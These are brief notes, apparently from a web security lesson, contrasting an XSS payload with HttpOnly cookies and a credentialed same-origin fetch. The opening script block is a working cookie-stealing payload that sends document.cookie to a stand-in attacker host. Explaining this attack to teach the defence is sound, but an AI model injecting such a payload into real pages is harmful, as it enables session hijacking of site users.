<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>


Set-Cookie: jwt_token=ey.....; HttpOnly
* Cookie is accessible only on the req / res cycle of the specific site (airtribe.live)


fetch("/api/user", {
  method: "GET",
  credentials: "include", 
});